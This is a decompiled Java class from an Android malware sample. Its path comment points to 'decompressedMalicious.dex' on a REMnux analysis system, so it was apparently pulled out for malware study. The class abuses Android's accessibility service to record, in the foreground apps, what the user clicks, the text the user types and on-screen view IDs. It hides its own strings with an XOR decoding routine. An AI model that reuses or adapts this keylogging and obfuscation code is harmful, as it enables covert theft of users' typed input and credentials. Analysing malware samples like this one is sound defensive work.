package com.zjxyxnvvp.nxvxchltf.j;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.h.b.a;
import com.zjxyxnvvp.nxvxchltf.util.e;
import java.util.ArrayList;
import java.util.List;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class b {

    /* renamed from: a */
    private static a f344a;
    private static short[] $ = {6327, 8484, 8491, 8494, 8484, 8492, 8482, 8483, 8541, 8519, 647, 662, 647, 666, 662, 760, 738, 4031, 4014, 4031, 4002, 4014, 4005, 4009, 4031, 4022, 4032, 4058, 9554, 9557, 9558, 9566, 9564, 9547, 9475, 9288, 9248, 9252, 9273, 9254, 9275, 9277, 9256, 9255, 9277, 9289, 9260, 9277, 9260, 9265, 9277, 9299, 9289, 5373, 5269, 5265, 5260, 5267, 5262, 5256, 5277, 5266, 5256, 5372, 5279, 5264, 5269, 5279, 5271, 5273, 5272, 5350, 5372, 2291, 2203, 2207, 2178, 2205, 2176, 2182, 2195, 2204, 2182, 2290, 2199, 2182, 2199, 2186, 2182, 2189, 2177, 2199, 2206, 2280, 2290};

    /* renamed from: b */
    public static List<a> f345b = new ArrayList();
    static String c = "";
    static boolean d = false;
    public static boolean e = false;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo b2;
        d dVar = d.e;
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        boolean z = e;
        String str = "";
        String $2 = $(0, 1, 6295);
        if (z) {
            if (accessibilityEvent.getEventType() == 1) {
                StringBuilder sb = new StringBuilder();
                sb.append($(1, 10, 8551));
                sb.append((Object) accessibilityEvent.getPackageName());
                sb.append($2);
                sb.append(accessibilityEvent.getText());
                sb.append($2);
                AccessibilityNodeInfo accessibilityNodeInfo2 = UIDNwaidobaWIODb.i;
                sb.append(accessibilityNodeInfo2 == null ? str : accessibilityNodeInfo2.getViewIdResourceName());
                e.a(sb.toString());
            }
            if (accessibilityEvent.getEventType() == 16) {
                e.a($(10, 17, 706) + ((Object) accessibilityEvent.getPackageName()) + $2 + accessibilityEvent.getText());
            }
            if (accessibilityEvent.getEventType() == 8192) {
                e.a($(17, 28, 4090) + ((Object) accessibilityEvent.getPackageName()) + $2 + accessibilityEvent.getText());
            }
        }
        if (accessibilityNodeInfo != null) {
            boolean z2 = (!d || (b2 = UIDNwaidobaWIODb.e.b()) == null || accessibilityEvent.getPackageName() == null) ? true : !b2.getPackageName().equals(c);
            CharSequence packageName = accessibilityNodeInfo.getPackageName();
            if (packageName != null && !packageName.toString().equals(c) && z2) {
                a aVar = f344a;
                if (aVar != null && aVar.b().size() > 0) {
                    f345b.add(f344a);
                    f344a = null;
                }
                a aVar2 = dVar.f314a;
                boolean g = aVar2.g(accessibilityService, $(28, 35, 9529) + ((Object) packageName));
                d = g;
                if (g) {
                    f344a = new a(packageName.toString());
                }
                c = packageName.toString();
            }
        }
        if (d) {
            if (accessibilityEvent.getEventType() == 16) {
                a aVar3 = f344a;
                if (aVar3 != null) {
                    aVar3.a(accessibilityService, accessibilityEvent);
                }
                if (!e) {
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append($(35, 53, 9321));
                    sb2.append((Object) accessibilityEvent.getPackageName());
                    sb2.append($2);
                    sb2.append(accessibilityEvent.getText());
                    sb2.append($2);
                    AccessibilityNodeInfo accessibilityNodeInfo3 = UIDNwaidobaWIODb.i;
                    sb2.append(accessibilityNodeInfo3 == null ? str : accessibilityNodeInfo3.getViewIdResourceName());
                    e.a(sb2.toString());
                }
            }
            if (accessibilityEvent.getEventType() == 1 && !e) {
                StringBuilder sb3 = new StringBuilder();
                sb3.append($(53, 73, 5340));
                sb3.append((Object) accessibilityEvent.getPackageName());
                sb3.append($2);
                sb3.append(accessibilityEvent.getText());
                sb3.append($2);
                AccessibilityNodeInfo accessibilityNodeInfo4 = UIDNwaidobaWIODb.i;
                sb3.append(accessibilityNodeInfo4 == null ? str : accessibilityNodeInfo4.getViewIdResourceName());
                e.b(sb3.toString(), false);
            }
            if (accessibilityEvent.getEventType() == 8192 && !e) {
                StringBuilder sb4 = new StringBuilder();
                sb4.append($(73, 95, 2258));
                sb4.append((Object) accessibilityEvent.getPackageName());
                sb4.append($2);
                sb4.append(accessibilityEvent.getText());
                sb4.append($2);
                AccessibilityNodeInfo accessibilityNodeInfo5 = UIDNwaidobaWIODb.i;
                if (accessibilityNodeInfo5 != null) {
                    str = accessibilityNodeInfo5.getViewIdResourceName();
                }
                sb4.append(str);
                e.a(sb4.toString());
            }
        }
    }
}
